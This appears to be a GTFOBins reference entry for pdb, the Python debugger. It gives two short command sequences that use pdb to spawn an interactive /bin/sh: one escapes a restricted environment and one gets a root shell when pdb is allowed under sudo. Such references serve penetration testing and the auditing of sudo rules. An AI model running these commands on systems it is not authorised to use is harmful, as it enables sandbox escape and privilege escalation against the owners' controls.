# GTFOBin: pdb

This allows to execute `python` code, other functions may apply.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
TF=$(mktemp)
echo 'import os; os.system("/bin/sh")' > $TF
pdb $TF
cont
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
TF=$(mktemp)
echo 'import os; os.system("/bin/sh")' > $TF
sudo pdb $TF
cont
```